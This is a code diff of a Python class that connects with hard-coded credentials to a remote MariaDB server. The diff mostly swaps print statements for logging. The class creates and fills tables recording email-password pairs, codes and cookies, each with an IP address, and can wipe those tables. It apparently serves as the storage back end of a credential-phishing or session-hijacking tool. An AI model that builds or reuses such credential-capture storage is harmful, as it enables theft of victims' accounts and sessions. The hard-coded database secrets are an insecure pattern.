@@ -1,6 +1,8 @@
 # Module Imports
 import mariadb
 import sys 
+### logger ###
+from log.conf_log import logger
 from datetime import datetime
 class MariaDB:
     def __init__(self):
@@ -9,13 +11,14 @@ class MariaDB:
                 user="amine", 
                 password="amine", 
                 host="161.97.178.112", 
-                port=3307, 
+                port=3307,
+                autocommit=True,
                 database="ea_python" 
             )
-            print('MariaDb has succussfully connected')
+            logger.info('MariaDb has succussfully connected')
             self.curr = self.conn.cursor()
         except mariadb.Error as e: 
-            print(f"Error connecting to MariaDB Platform: {e}") 
+            logger.info(f"Error connecting to MariaDB Platform: {e}") 
             self.conn = None
             self.curr = None
         # Connect to MariaDB Platform
@@ -28,11 +31,11 @@ class MariaDB:
                 port=3307, 
                 database="ea_python" 
             ) 
-            print('connected to db ')
+            logger.info('connected to db ')
             curr = conn.cursor()
             return (conn, curr)
         except mariadb.Error as e: 
-            print(f"Error connecting to MariaDB Platform: {e}") 
+            logger.info(f"Error connecting to MariaDB Platform: {e}") 
             conn = "error"
             sys.exit(1) 
 
@@ -44,52 +47,52 @@ class MariaDB:
         cmd_createCode = "CREATE TABLE IF NOT EXISTS Code(id_time TEXT UNIQUE KEY NOT NULL, code TEXT, ip TEXT)"
         cmd_createCookies = "CREATE TABLE IF NOT EXISTS Cookies(id_time TEXT UNIQUE KEY NOT NULL, cookies TEXT, ip TEXT)"
         if self.curr.execute(cmd_createAuth) :
-            print('auth table created')
+            logger.info('auth table created')
         else : 
-            print('auth table already exists')
+            logger.info('auth table already exists')
         if self.curr.execute(cmd_createCode) :
-            print('code table created')
+            logger.info('code table created')
         else : 
-            print('code table already exists')
+            logger.info('code table already exists')
         if self.curr.execute(cmd_createCookies):
-            print('Cookies Table Created')
+            logger.info('Cookies Table Created')
         else : 
-            print('Cookies Table Already EXISTS')
+            logger.info('Cookies Table Already EXISTS')
     # print('Cookies table created')
         self.conn.commit()
 
     def addAuth(self, _id, email, password, ip):
         self.curr.execute("INSERT INTO Auth(id_time,email,password,ip) VALUES(?,?,?,?)",(_id,email,password,ip))
         self.conn.commit()
-        print("login infos added")
+        logger.info("login infos added")
 
     def addCode(self, _id, code, ip):
         self.curr.execute("INSERT INTO Code(id_time,code,ip) VALUES(?,?,?)",(_id, code, ip))
         self.conn.commit()
-        print("code added")
+        logger.info("code added")
     
     def addCookies(self, _id, cookies, ip):
         self.curr.execute("INSERT INTO Cookies(id_time,cookies,ip) VALUES(?,?,?)",(_id,cookies,ip))
         self.conn.commit()
-        print("cookies infos added TO DB")
+        logger.info("cookies infos added TO DB")
 
     ########################################
         
     def clearAuths(self):
         cmd = "TRUNCATE TABLE Auth"
         self.curr.execute(cmd)
-        print('Auth table Cleared')
+        logger.info('Auth table Cleared')
 
 
     def clearCode(self):
         cmd = "TRUNCATE TABLE Code"
         self.curr.execute(cmd)
-        print('Code table Cleared')
+        logger.info('Code table Cleared')
 
     def clearCookies(self):
         cmd = "TRUNCATE TABLE Cookies"
         self.curr.execute(cmd)
-        print('Cookies table Cleared')
+        logger.info('Cookies table Cleared')
 
     def clearRecords(self):
         self.clearAuths()
@@ -137,7 +140,7 @@ class MariaDB:
         # return result.fetchall()
 
 # db = MariaDB()
-# # db.clearRecords()
+# db.clearRecords()
 # db.createTables()
 # print(db.getCookies())
 # db.clearAuths()
